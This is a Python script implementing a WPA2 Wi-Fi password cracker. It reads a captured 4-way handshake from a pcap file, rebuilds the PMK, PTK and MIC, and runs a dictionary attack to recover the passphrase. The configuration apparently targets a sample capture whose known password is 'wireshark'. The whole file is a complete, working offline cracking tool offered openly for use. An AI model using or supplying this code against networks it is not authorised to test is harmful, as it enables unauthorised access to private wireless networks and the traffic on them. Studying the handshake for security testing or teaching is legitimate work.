import scapy.all as scapy
from pbkdf2 import PBKDF2
import hmac
import hashlib
import binascii
import struct

class WPA2Cracker:
    def __init__(self, pcap_file, ssid):
        self.pcap_file = pcap_file
        self.ssid = ssid
        self.handshake_data = None
    
    def extract_handshake(self):
        """
        Extract WPA2 4-way handshake packets from a pcap file.
        Returns ANonce, SNonce, AP_MAC, Client_MAC, MIC, and MIC_data.
        """
        try:
            packets = scapy.rdpcap(self.pcap_file)
            print(f"Loaded {len(packets)} packets from {self.pcap_file}")
        except Exception as e:
            print(f"Error reading pcap file: {e}")
            return None
        
        eapol_packets = []
        
        # Filter EAPOL packets and show detailed info
        for i, pkt in enumerate(packets):
            if pkt.haslayer(scapy.EAPOL) and pkt.haslayer(scapy.Dot11):
                eapol = pkt[scapy.EAPOL]
                if eapol.type == 3:  # Key frame
                    eapol_packets.append(pkt)
                    print(f"Found EAPOL packet {len(eapol_packets)} at index {i}")
        
        print(f"Found {len(eapol_packets)} EAPOL key packets")
        
        if len(eapol_packets) < 2:
            print("Not enough EAPOL packets found for handshake")
            return None
        
        # Sort packets by timestamp
        eapol_packets.sort(key=lambda x: x.time)
        
        anonce, snonce, ap_mac, client_mac, mic, mic_data = None, None, None, None, None, None
        
        for i, pkt in enumerate(eapol_packets):
            try:
                eapol = pkt[scapy.EAPOL]
                dot11 = pkt[scapy.Dot11]
                
                # Get the raw EAPOL payload starting from the version field
                eapol_raw = bytes(eapol)
                
                # EAPOL Key packet structure:
                # 0: Version (1 byte)
                # 1: Type (1 byte) 
                # 2-3: Length (2 bytes)
                # 4: Descriptor Type (1 byte)
                # 5-6: Key Information (2 bytes)
                # 7-8: Key Length (2 bytes)
                # 9-16: Replay Counter (8 bytes)
                # 17-48: Key Nonce (32 bytes)
                # 49-64: Key IV (16 bytes)
                # 65-72: Key RSC (8 bytes)
                # 73-80: Key ID (8 bytes)
                # 81-96: Key MIC (16 bytes)
                # 97-98: Key Data Length (2 bytes)
                # 99+: Key Data
                
                if len(eapol_raw) < 97:
                    print(f"EAPOL packet {i+1} too short: {len(eapol_raw)} bytes")
                    continue
                
                # Extract key information from fixed positions
                key_info = struct.unpack('>H', eapol_raw[5:7])[0]
                key_nonce = eapol_raw[17:49]  # 32 bytes
                key_mic = eapol_raw[81:97]    # 16 bytes
                
                # Check flags
                pairwise = (key_info & 0x0008) != 0
                install = (key_info & 0x0040) != 0
                ack = (key_info & 0x0080) != 0
                mic_flag = (key_info & 0x0100) != 0
                secure = (key_info & 0x0200) != 0
                
                print(f"Packet {i+1}: Key_Info=0x{key_info:04x}, "
                      f"Pairwise={pairwise}, ACK={ack}, MIC={mic_flag}, "
                      f"Install={install}, Secure={secure}")
                
                # Message 1: ANonce from AP (ACK=1, MIC=0)
                if pairwise and ack and not mic_flag and not anonce:
                    anonce = key_nonce
                    ap_mac = dot11.addr2.replace(':', '').lower()
                    client_mac = dot11.addr1.replace(':', '').lower()
                    print(f"  -> Message 1: ANonce found")
                
                # Message 2: SNonce from client (MIC=1, ACK=0)
                elif pairwise and mic_flag and not ack and not snonce:
                    snonce = key_nonce
                    mic = key_mic
                    
                    # For MIC calculation, we need the entire EAPOL frame with MIC field zeroed
                    mic_data = eapol_raw[:81] + b'\x00' * 16 + eapol_raw[97:]
                    print(f"  -> Message 2: SNonce and MIC found")
                        
            except Exception as e:
                print(f"Error processing packet {i+1}: {e}")
                continue
        
        # Debug: Show what we found
        print(f"\nExtraction Results:")
        print(f"ANonce: {'Found' if anonce else 'Missing'}")
        print(f"SNonce: {'Found' if snonce else 'Missing'}")
        print(f"AP MAC: {'Found' if ap_mac else 'Missing'}")
        print(f"Client MAC: {'Found' if client_mac else 'Missing'}")
        print(f"MIC: {'Found' if mic else 'Missing'}")
        
        if not all([anonce, snonce, ap_mac, client_mac, mic, mic_data]):
            print("Failed to extract complete handshake data")
            return None
        
        self.handshake_data = {
            'anonce': anonce,
            'snonce': snonce,
            'ap_mac': ap_mac,
            'client_mac': client_mac,
            'mic': mic,
            'mic_data': mic_data
        }
        
        print(f"\nHandshake extracted successfully:")
        print(f"  ANonce: {binascii.hexlify(anonce).decode()}")
        print(f"  SNonce: {binascii.hexlify(snonce).decode()}")
        print(f"  AP MAC: {ap_mac}")
        print(f"  Client MAC: {client_mac}")
        print(f"  MIC: {binascii.hexlify(mic).decode()}")
        
        return self.handshake_data
    
    def derive_ptk(self, passphrase):
        """
        Derive the Pairwise Transient Key (PTK) from passphrase and handshake data.
        """
        if not self.handshake_data:
            raise ValueError("No handshake data available")
        
        # Step 1: Derive PMK using PBKDF2
        pmk = PBKDF2(passphrase, self.ssid.encode('utf-8'), 4096).read(32)
        
        # Step 2: Prepare data for PTK derivation
        # Convert MAC addresses to bytes
        mac1 = bytes.fromhex(self.handshake_data['ap_mac'])
        mac2 = bytes.fromhex(self.handshake_data['client_mac'])
        
        # Sort MAC addresses (lexicographically smaller first)
        if mac1 < mac2:
            mac_data = mac1 + mac2
        else:
            mac_data = mac2 + mac1
        
        # Sort nonces (lexicographically smaller first)
        nonce1 = self.handshake_data['anonce']
        nonce2 = self.handshake_data['snonce']
        
        if nonce1 < nonce2:
            nonce_data = nonce1 + nonce2
        else:
            nonce_data = nonce2 + nonce1
        
        # Step 3: Derive PTK using PRF
        # PRF input: "Pairwise key expansion" + null + MAC1 + MAC2 + Nonce1 + Nonce2
        prf_input = mac_data + nonce_data
        ptk = self._prf(pmk, b"Pairwise key expansion\x00", prf_input, 64)
        
        # Return KCK (Key Confirmation Key) - first 16 bytes for MIC calculation
        return ptk[:16]
    
    def _prf(self, key, prefix, data, output_len):
        """
        Pseudo-Random Function for PTK derivation using HMAC-SHA1
        """
        result = b""
        counter = 0
        
        while len(result) < output_len:
            # Create HMAC input: prefix + data + counter (as single byte)
            hmac_input = prefix + data + bytes([counter])
            result += hmac.new(key, hmac_input, hashlib.sha1).digest()
            counter += 1
        
        return result[:output_len]
    
    def compute_mic(self, kck):
        """
        Compute MIC using the Key Confirmation Key (KCK)
        For WPA2, MIC is computed using HMAC-SHA1 truncated to 16 bytes
        """
        if not self.handshake_data:
            raise ValueError("No handshake data available")
        
        # MIC is calculated over the entire EAPOL frame with MIC field set to zeros
        return hmac.new(kck, self.handshake_data['mic_data'], hashlib.sha1).digest()[:16]
    
    def verify_passphrase(self, passphrase, debug=False):
        """
        Verify if a passphrase is correct by comparing computed MIC with captured MIC
        """
        try:
            kck = self.derive_ptk(passphrase)
            computed_mic = self.compute_mic(kck)
            expected_mic = self.handshake_data['mic']
            
            if debug or passphrase == "wireshark":
                print(f"\nDebug for password '{passphrase}':")
                print(f"  KCK: {binascii.hexlify(kck).decode()}")
                print(f"  Computed MIC: {binascii.hexlify(computed_mic).decode()}")
                print(f"  Expected MIC:  {binascii.hexlify(expected_mic).decode()}")
                print(f"  Match: {computed_mic == expected_mic}")
            
            return computed_mic == expected_mic
        except Exception as e:
            print(f"Error verifying passphrase '{passphrase}': {e}")
            return False
    
    def dictionary_attack(self, dictionary_file):
        """
        Perform dictionary attack on the extracted handshake
        """
        if not self.handshake_data:
            print("No handshake data available. Run extract_handshake() first.")
            return None
        
        try:
            with open(dictionary_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error reading dictionary file: {e}")
            return None
        
        print(f"Starting dictionary attack with {len(passwords)} passwords...")
        
        # First, test with the known password to verify our implementation
        print("\nTesting with known password 'wireshark':")
        if self.verify_passphrase("wireshark", debug=True):
            print("✓ Known password verification successful!")
        else:
            print("✗ Known password verification failed - there may be an issue with extraction")
        
        for i, passphrase in enumerate(passwords, 1):
            if len(passphrase) < 8 or len(passphrase) > 63:
                continue  # WPA2 passwords must be 8-63 characters
            
            if self.verify_passphrase(passphrase):
                print(f"\n✓ PASSWORD FOUND: {passphrase}")
                return passphrase
            
            if i % 10 == 0:  # More frequent updates for debugging
                print(f"Tried {i}/{len(passwords)} passwords...")
        
        print("Password not found in dictionary.")
        return None


def inspect_pcap(pcap_file):
    """
    Inspect the pcap file to understand its structure
    """
    try:
        packets = scapy.rdpcap(pcap_file)
        print(f"=== PCAP INSPECTION: {pcap_file} ===")
        print(f"Total packets: {len(packets)}")
        
        eapol_count = 0
        dot11_count = 0
        
        for i, pkt in enumerate(packets):
            if pkt.haslayer(scapy.Dot11):
                dot11_count += 1
            if pkt.haslayer(scapy.EAPOL):
                eapol_count += 1
                eapol = pkt[scapy.EAPOL]
                print(f"Packet {i}: EAPOL Type={eapol.type}")
                
                # Show raw bytes for debugging
                eapol_raw = bytes(eapol)
                if len(eapol_raw) >= 97:
                    key_info = struct.unpack('>H', eapol_raw[5:7])[0]
                    print(f"  Key Info: 0x{key_info:04x}")
                    print(f"  Raw length: {len(eapol_raw)} bytes")
        
        print(f"802.11 packets: {dot11_count}")
        print(f"EAPOL packets: {eapol_count}")
        print("=" * 50)
        
    except Exception as e:
        print(f"Error inspecting pcap: {e}")


def main():
    # Configuration
    pcap_file = "handshake.pcap"  # Replace with your pcap file
    ssid = "ikeriri-5g"
    dictionary_file = "dictionary.txt"
    
    # First, inspect the pcap file
    inspect_pcap(pcap_file)
    
    # Create test dictionary with known password
    print("Creating test dictionary...")
    with open(dictionary_file, 'w') as f:
        test_passwords = [
            "password1",
            "123456789",
            "qwerty123",
            "wireshark",  # Known correct password
            "admin1234",
            "test12345"
        ]
        for pwd in test_passwords:
            f.write(pwd + "\n")
    
    # Initialize cracker
    cracker = WPA2Cracker(pcap_file, ssid)
    
    # Extract handshake
    print("\nExtracting handshake from pcap file...")
    handshake = cracker.extract_handshake()
    
    if not handshake:
        print("Failed to extract handshake. Check your pcap file.")
        return
    
    # Perform dictionary attack
    print("\nStarting dictionary attack...")
    result = cracker.dictionary_attack(dictionary_file)
    
    if result:
        print(f"\n🎉 Attack successful! Password: {result}")
    else:
        print("\n❌ Attack failed. Password not in dictionary.")


if __name__ == "__main__":
    main()